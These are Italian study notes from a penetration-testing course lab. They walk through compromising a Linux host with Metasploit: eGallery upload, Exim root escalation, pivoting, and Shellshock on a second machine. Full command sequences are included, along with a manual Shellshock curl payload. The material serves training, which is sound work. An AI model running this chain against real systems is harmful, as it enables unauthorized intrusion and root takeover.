# 023 — Linux Black-Box Penetration Test (Network Penetration Testing)

> **Modulo:** Network Penetration Testing · **Video:** 23/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [023_Linux_Black-Box_Penetration_Test.mp4.txt](023_Linux_Black-Box_Penetration_Test.mp4.txt) · [023_Linux_Black-Box_Penetration_Test.mp4.srt](023_Linux_Black-Box_Penetration_Test.mp4.srt)

## Concetti chiave

- Lab end-to-end Linux: **initial access via web app (eGallery arbitrary file upload)** → **privesc Exim** → **pivoting** verso 2° target → **ShellShock RCE** via CGI.
- Chain dei tool: **nmap → searchsploit → Metasploit → autoroute → portfwd → proxy → bind shell**.
- **Exim 4.89** vulnerabile a buffer overflow privesc local → da www-data a root.
- **Shellshock** (CVE-2014-6271) = bash function definition vuln → RCE via header/env in CGI.
- **Bind shell** necessario quando il target NON può iniziare connessione verso l'attaccante (port forwarding asimmetrico).

## Spiegazione approfondita

### Step 1 — Recon iniziale (target1: demo.ine.local)
```bash
sudo nmap -sV demo.ine.local
# 25/tcp open smtp     Exim smtpd 4.89
# 80/tcp open http     Apache httpd 2.4.7 ((Ubuntu))
```

### Step 2 — Web app discovery
Browser → `http://demo.ine.local` → eGallery (PHP image gallery).

```bash
searchsploit eGallery
# eGallery - Arbitrary File Upload  (Metasploit)
```

### Step 3 — Initial access via Metasploit
```
msf6 > search egallery
msf6 > use exploit/unix/webapp/egallery_upload
msf6 > set LHOST <kali>
msf6 > set RHOSTS demo.ine.local
msf6 > set TARGETURI /                 # root del web server
msf6 > exploit
# → meterpreter session 1 (www-data)
```

### Step 4 — Local enumeration
```
meterpreter > sysinfo
meterpreter > getuid          # www-data
meterpreter > sysinfo         # Ubuntu 14.04, kernel 3.x
```

### Step 5 — Privilege escalation via Exim
Exim 4.89 vulnerabile (CVE-2019-10149 "Return of the WIZard"):
```
msf6 > search exim
msf6 > use exploit/linux/local/exim4_deliver_message_priv_esc
msf6 > set SESSION 1
msf6 > set LHOST <kali>
msf6 > set LPORT 4445
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 > exploit
# → session 2 con uid=0 (root)
```

### Step 6 — Scoperta second network
```
meterpreter > ifconfig
# eth0 → rete pubblica (demo.ine.local)
# eth1 → 192.x.x.x/24 (rete interna)
meterpreter > cat /etc/hosts
```

### Step 7 — Pivoting con `autoroute`
```
meterpreter > run autoroute -s 192.x.x.0/24
meterpreter > background
```

### Step 8 — Port scan via pivot
```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.x.x.3-5
msf6 > set PORTS 1-1024
msf6 > run
# → 192.x.x.3 ha porta 80 open
```

### Step 9 — Port forwarding per browser access
```
meterpreter > portfwd add -l 1234 -p 80 -r 192.x.x.3
meterpreter > portfwd list
```

Da Kali:
```bash
curl http://localhost:1234
# Pagina con iframe → /cgi-bin/stats
```

Source HTML rivela `/cgi-bin/stats` → segnale forte di **Shellshock**.

### Step 10 — Verifica Shellshock
```
msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 > set RHOSTS 192.x.x.3
msf6 > set TARGETURI /cgi-bin/stats
msf6 > run
# → vulnerable, id command returns www-data
```

### Step 11 — Exploit Shellshock con BIND shell
Reverse non funziona (target non può raggiungere Kali fuori dal pivot):
```
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 > set RHOSTS 192.x.x.3
msf6 > set TARGETURI /cgi-bin/stats
msf6 > set PAYLOAD linux/x86/meterpreter/bind_tcp     # ← BIND, non reverse
msf6 > set LPORT 4446
msf6 > exploit
# → session 3 su demo2.ine.local
```

## Comandi & strumenti

| Tool / Modulo | Scopo |
|---|---|
| `searchsploit <prodotto>` | Cerca exploit pubblici/Metasploit |
| `exploit/unix/webapp/egallery_upload` | Initial access via PHP gallery |
| `exploit/linux/local/exim4_deliver_message_priv_esc` | Privesc Exim 4.x |
| `run autoroute -s <subnet>` (meterpreter) | Aggiunge route via session |
| `auxiliary/scanner/portscan/tcp` | Port scan via pivot |
| `portfwd add -l <local> -p <remote> -r <ip>` | Port forward locale |
| `auxiliary/scanner/http/apache_mod_cgi_bash_env` | Check ShellShock |
| `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Exploit ShellShock |
| `payload linux/x86/meterpreter/bind_tcp` | Bind shell (target listening) |
| `payload linux/x86/meterpreter/reverse_tcp` | Reverse shell (default) |

## Esempi pratici

```bash
# Recon
sudo nmap -sV demo.ine.local
searchsploit egallery
searchsploit exim 4.89
```

```
# Catena completa
msf6 > use exploit/unix/webapp/egallery_upload
msf6 > set LHOST <kali> ; set RHOSTS demo.ine.local ; set TARGETURI /
msf6 > exploit
# session 1 (www-data)

msf6 > use exploit/linux/local/exim4_deliver_message_priv_esc
msf6 > set SESSION 1 ; set LHOST <kali> ; set LPORT 4445
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 > exploit
# session 2 (root)

meterpreter > run autoroute -s 192.x.x.0/24
meterpreter > portfwd add -l 1234 -p 80 -r 192.x.x.3
meterpreter > background

msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 > set RHOSTS 192.x.x.3 ; set TARGETURI /cgi-bin/stats
msf6 > run

msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 > set RHOSTS 192.x.x.3 ; set TARGETURI /cgi-bin/stats
msf6 > set PAYLOAD linux/x86/meterpreter/bind_tcp
msf6 > set LPORT 4446
msf6 > exploit
# session 3 (demo2)
```

Nota extra: Shellshock manuale con `curl`:
```bash
curl -A "() { :; }; /bin/bash -c 'id'" http://target/cgi-bin/stats
```

## Punti d'attenzione per l'esame eCPPT

- **Black-box Linux flow tipico**: recon nmap → searchsploit banner → exploit web → privesc → pivot.
- **`searchsploit <prod> <ver>`** è il primo passo dopo un banner sospetto.
- **Exim 4.x** è vulnerabile a multiple CVE (4.87-4.91 → CVE-2019-10149). Modulo Metasploit pronto.
- **autoroute**: `run autoroute -s <subnet>` (modulo nativo meterpreter) o `post/multi/manage/autoroute`.
- **portfwd**: `portfwd add -l <localport> -p <remoteport> -r <remoteIP>` → accesso diretto a servizi target via porta locale.
- **`auxiliary/scanner/portscan/tcp`** funziona anche **attraverso un route Metasploit** (non serve Nmap).
- **Shellshock** (CVE-2014-6271): `() { :; }; <cmd>` in HTTP header → RCE su CGI bash.
- **Bind vs Reverse shell**: usare BIND quando il target non può iniziare connessioni outbound (è dietro NAT/pivot).
- **CGI scripts** spesso indicano vulnerabilità classiche (ShellShock, command injection).
- **`/cgi-bin/`** URL → red flag → testare ShellShock.

## Collegamenti con altri video

- Precedente: [[022_MSSQL_DB_User_Impersonation_to_RCE.mp4]]
- Prossimo: [[024_Dumping___Cracking_NTLM_Hashes.mp4]]
- Enum Linux di base: [[020_Linux_Service_Enumeration.mp4]]
- Pivoting equivalente Windows: [[025_Windows_Post-Exploitation_Lab.mp4]]
- Privilege escalation Linux dettagliata: modulo Privilege Escalation.
- Lateral movement / port forwarding avanzato: modulo Lateral Movement & Pivoting.
